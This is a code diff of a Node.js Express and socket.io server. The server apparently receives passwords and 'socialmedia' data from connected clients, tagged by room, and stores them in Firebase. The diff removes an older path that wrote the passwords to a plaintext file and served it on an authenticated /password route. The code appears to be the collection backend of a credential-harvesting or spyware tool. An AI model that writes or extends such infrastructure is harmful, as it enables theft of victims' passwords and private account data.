@@ -3,7 +3,7 @@ var App = express()
 var Bodyparser = require('body-parser')
 var cookieParser = require('cookie-parser')
 var {rateLimit} = require("express-rate-limit")
-var fs = require('fs')
+
 var PORT =  process.env.PORT || 4000 
 
 require("dotenv").config({path:"./MYDATA.env"})
@@ -24,14 +24,6 @@ var path = require('path')
 
 
 
-
-async function  WriteFile(data){
-  try{
-  await fs.appendFileSync("./views/allpassword.txt",data)
-  }catch(err){
-    console.log("ERROR : file not write "+err)
-  }
-}
 
 
 
@@ -162,9 +154,6 @@ App.get("/image",UserAuth,(req,res)=>{
 
 
 
-App.get("/password",UserAuth,(req,res)=>{
-  res.sendFile(path.join(__dirname,"views","allpassword.txt"))
-})
 
 
 App.post("/login",(req,res)=>{
@@ -340,22 +329,22 @@ socket.on('connection',Socket=>{
 
 
    Socket.on("password",(room,data)=>{
-    console.log("Password")
+  
   FirbaseDatabase.push(FirbaseDatabase.ref(firebasedatabase,"password"),{"id":room,"password":data}).then(()=>{
-    console.log("Suscess full")
+    
   }).catch(()=>{
-    console.log("error")
+    console.log("error password")
   })
 
   })
 
   Socket.on("socialmedia",(room,data)=>{
 
-    console.log("Social media")
+  
     FirbaseDatabase.push(FirbaseDatabase.ref(firebasedatabase,"socialmedia"),{"id":room,"data":data}).then(()=>{
-              console.log("Suscess full")
+        
             }).catch(()=>{
-              console.log("error")
+              console.log("error socialmedia")
             })
   })
 
